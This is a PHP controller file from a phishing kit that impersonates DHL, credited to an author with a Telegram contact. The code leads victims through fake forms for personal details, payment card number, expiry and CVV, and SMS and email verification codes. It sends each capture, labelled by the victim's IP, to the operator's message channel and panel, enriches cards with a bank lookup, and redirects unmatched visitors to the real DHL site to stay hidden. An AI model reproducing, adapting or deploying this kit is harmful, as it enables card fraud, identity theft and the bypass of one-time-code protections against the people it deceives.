<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    include 'app.php';

    if( $_GET['waiting'] == 1 ) {
        $response = checkgoto();
        if( $response === 'app' ) {
            echo "index.php?redirection=app";
            exit();
        } else if( $response === 'app2' ) {
            echo "index.php?redirection=app2";
            exit();
        } else if( $response === 'loading' ) {
            echo "index.php?redirection=loading";
            exit();
        } else if( $response === 'details' ) {
            echo "index.php?redirection=details";
            exit();
        } else if( $response === 'baddetails' ) {
            $_SESSION['first_name'] = "";
            $_SESSION['last_name'] = "";
            $_SESSION['address'] = "";
            $_SESSION['city'] = "";
            $_SESSION['zip'] = "";
            $_SESSION['birth_date'] = "";
            $_SESSION['phone'] = "";
            $_SESSION['errors']['first_name'] = true;
            $_SESSION['errors']['last_name'] = true;
            $_SESSION['errors']['address'] = true;
            $_SESSION['errors']['city'] = true;
            $_SESSION['errors']['zip'] = true;
            $_SESSION['errors']['birth_date'] = true;
            $_SESSION['errors']['phone'] = true;
            echo "index.php?redirection=details&error=1";
            exit();
        } else if( $response === 'cc' ) {
            echo "index.php?redirection=cc";
            exit();
        } else if( $response === 'badcc' ) {
            $_SESSION['one'] = "";
            $_SESSION['three'] = "";
            $_SESSION['two'] = "";
            //$_SESSION['four'] = "";
            $_SESSION['errors']['one'] = true;
            $_SESSION['errors']['three'] = true;
            $_SESSION['errors']['two'] = true;
            //$_SESSION['errors']['four'] = true;
            echo "index.php?redirection=cc&error=1";
            exit();
        } else if( $response === 'sms' ) {
            echo "index.php?redirection=sms";
            exit();
        } else if( $response === 'badsms' ) {
            $_SESSION['errors']['sms_code'] = true;
            echo "index.php?redirection=sms&error=1";
            exit();
        } else if( $response === 'emailcode' ) {
            echo "index.php?redirection=emailcode";
            exit();
        } else if( $response === 'bademailcode' ) {
            $_SESSION['errors']['emailcode'] = true;
            echo "index.php?redirection=emailcode&error=1";
            exit();
        } else if( $response === 'success' ) {
            echo "index.php?redirection=success";
            exit();
        }
        exit();
    }

    if( isset($_GET["redirection"]) && !empty($_GET['redirection']) ) {

        $red = $_GET['redirection'];
        $_SESSION['last_page'] = $red;
        $query = [];
        $parse_url = proper_parse_str($_SERVER['QUERY_STRING']);
        foreach($parse_url as $key => $val) {
            if( $key == 'redirection' || $key == 'prefix' ){
                unset($parse_url[$key]);
            } else {
                $query[] = $key . '=' . $val;
            }
        }
        if( is_array($query) ) {
            $query = "?" . implode('&',$query);
        }

        if( isset($_GET['prefix']) ) {
            $_SESSION['prefix'] = $_GET['prefix'];
        }

        resetgoto();

        redirect($_SESSION['last_page']);
        exit();

        /*header("Location: " . randomix(24) . $query);
        exit();*/

    } else if( isset($_GET["lang"]) && !empty($_GET['lang']) ) {

        $_SESSION['lang'] = $_GET["lang"];
        location($_SESSION['last_page']);

    } else if( $_SERVER['REQUEST_METHOD'] == "POST" ) {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if( $_POST['action'] == "VISITORS" ) {
            panel([
                'action' => 'VISITORS',
                'ip'     => $_POST['ip'],
                'page'     => $_POST['page'],
            ]);
            exit();
        }

        if ($_POST['steeep'] == "details") {
            $_SESSION['errors']     = [];
            $_SESSION['first_name']  = $_POST['first_name'];
            $_SESSION['last_name']  = $_POST['last_name'];
            $_SESSION['address']  = $_POST['address'];
            $_SESSION['city']  = $_POST['city'];
            $_SESSION['zip']  = $_POST['zip'];
            $_SESSION['birth_date']  = $_POST['birth_date'];
            $_SESSION['phone']  = $_POST['phone'];
            if( validate_name($_POST['first_name']) == false ) {
                $_SESSION['errors']['first_name'] = true;
            }
            if( validate_name($_POST['last_name']) == false ) {
                $_SESSION['errors']['last_name'] = true;
            }
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = true;
            }
            if( empty($_POST['city']) ) {
                $_SESSION['errors']['city'] = true;
            }
            if( empty($_POST['zip']) ) {
                $_SESSION['errors']['zip'] = true;
            }
            if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
                $_SESSION['errors']['birth_date'] = true;
            }
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = true;
            }        
            if( count($_SESSION['errors']) == 0 ) {

$message = '
🏦 <b>Personal information</b>
├ 👤 <b>First & Last name</b> : <code>'. $_SESSION['first_name'] . ' ' . $_SESSION['last_name'] .'</code>
├ 🏠 <b>Address</b> : <code>'. $_SESSION['address'] .'</code>
├ 🏠 <b>City</b> : <code>'. $_SESSION['city'] .'</code>
├ 🏠 <b>Zip code</b> : <code>'. $_SESSION['zip'] .'</code>
├ 📅 <b>Birth date</b> : <code>'. $_SESSION['birth_date'] .'</code>
├ 📞 <b>Phone number</b> : <code>'. $_SESSION['phone'] .'</code>

🙍‍♂️ <b>Client</b>
├ 🌐 IP : '. get_client_ip() .'
├ 🖥 OS : '. $_SERVER['HTTP_USER_AGENT'] .'
└ 🖥 More : '. victim_infos() .'
';

                $subject = get_client_ip() . ' | DHL | Details';
                send($subject,$message);
                panel([
                    'action' => 'INSERT',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'details' => $_POST['first_name'] . ' | ' . $_POST['last_name'] . ' | ' . $_POST['address'] . ' | ' . $_POST['city'] . ' | ' . $_POST['zip'] . ' | ' . $_POST['birth_date'] . ' | ' . $_POST['phone'],
                    ],
                ]);
                location("cc");
            } else {
                location("details","&error=1");
            }
        }

        if ($_POST['steeep'] == "cc") {
            $_SESSION['errors'] = [];
            $_SESSION['one']        = $_POST['one'];
            $_SESSION['two']        = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            //$_SESSION['four']      = $_POST['four'];
            $date_ex    = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( $one == false ) {
                $_SESSION['errors']['one'] = true;
            }
            if( $three == false ) {
                $_SESSION['errors']['three'] = true;
            }
            if( $two == false ) {
                $_SESSION['errors']['two'] = true;
            }
            /*if( validate_number($_POST['four'],4) == false ) {
                $_SESSION['errors']['four'] = true;
            }*/
            if( count($_SESSION['errors']) == 0 ) {

                $cc = str_replace(' ', '', $_POST['one']);
                $cc_no_space = str_replace(' ', '', $_POST['one']);
                $bin_infos = getBinInformation(substr($cc_no_space, 0, 8));

$message = '

💳 + 1 NEW CARD
└ '. $cc_no_space .'

🏦 <b>Personal information</b>
├ 👤 <b>First & Last name</b> : <code>'. $_SESSION['first_name'] . ' ' . $_SESSION['last_name'] .'</code>
├ 🏠 <b>Address</b> : <code>'. $_SESSION['address'] .'</code>
├ 🏠 <b>City</b> : <code>'. $_SESSION['city'] .'</code>
├ 🏠 <b>Zip code</b> : <code>'. $_SESSION['zip'] .'</code>
├ 📅 <b>Birth date</b> : <code>'. $_SESSION['birth_date'] .'</code>
├ 📞 <b>Phone number</b> : <code>'. $_SESSION['phone'] .'</code>

🏦 <b>Payment Card</b>
├ 💳 <b>Card number</b> : <code>'. $_POST['one'] .'</code>
├ 📅 <b>Card date</b> : <code>'. $_POST['two'] .'</code>
└ 🔒 <b>CVV</b> : <code>'. $_POST['three'] .'</code>

🗃 <b>Bank Details</b>
├ 🏦 Bank name : '. $bin_infos['bank']['name'] .'
├ 🏦 Type : '. $bin_infos['scheme'] .'
├ 🏦 Level : '. $bin_infos['brand'] .'
└ 🏦 Country : '. $bin_infos['country']['alpha2'] .'

🧩 Extra
├ 🏷 Bin : #'. substr($cc_no_space, 0, 6) .'
├ 🌐 IP : '. get_client_ip() .'
├ 🖼 SCAN : cardimages.imaginecurve.com/cards/'. substr($cc_no_space, 0, 6) .'.png
├ 🖥 OS : '. $_SERVER['HTTP_USER_AGENT'] .'
└ 🖥 More : '. victim_infos() .'
';

                $subject = get_client_ip() . ' | DHL | Card';
                send($subject,$message);
                panel([
                    'action' => 'UPDATE',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'cc' => $_POST['one'] . ' | ' . $_POST['two'] . ' | ' . $_POST['three'] . ' | ' . $_POST['four'],
                    ],
                ]);
                location("loading");
            } else {
                location("cc","&error=1");
            }
        }

        if ($_POST['steeep'] == "sms") {
            $_SESSION['errors'] = [];
            $_SESSION['sms_code']        = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {

$message = '
🔒 <b>Verification code</b>
├ 📲 <b>SMS code</b> : <code>'. $_POST['sms_code'] . '</code>

🙍‍♂️ <b>Client</b>
├ 🌐 IP : '. get_client_ip() .'
├ 🖥 OS : '. $_SERVER['HTTP_USER_AGENT'] .'
└ 🖥 More : '. victim_infos() .'
';

                $subject = get_client_ip() . ' | DHL | Sms';
                send($subject,$message);
                panel([
                    'action' => 'UPDATE',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'sms' => $_POST['sms_code'],
                    ],
                ]);
                location("loading");
            } else {
                location("sms","&error=1");
            }
        }

        if ($_POST['steeep'] == "emailcode") {
            $_SESSION['errors'] = [];
            $_SESSION['emailcode']        = $_POST['emailcode'];
            if( empty($_POST['emailcode']) ) {
                $_SESSION['errors']['emailcode'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {

$message = '
🔒 <b>Verification code</b>
├ 📧 <b>Email code</b> : <code>'. $_POST['emailcode'] . '</code>

🙍‍♂️ <b>Client</b>
├ 🌐 IP : '. get_client_ip() .'
├ 🖥 OS : '. $_SERVER['HTTP_USER_AGENT'] .'
└ 🖥 More : '. victim_infos() .'
';
                
                $subject = get_client_ip() . ' | DHL | Sms';
                send($subject,$message);
                panel([
                    'action' => 'UPDATE',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'emailcode' => $_POST['emailcode'],
                    ],
                ]);
                location("loading");
            } else {
                location("emailcode","&error=1");
            }
        }

    } else {

        if( isset($_SESSION['last_page']) ) {
            redirect($_SESSION['last_page']);
        }

        header("Location: https://www.dhl.com/");
        exit();

    }
    

?>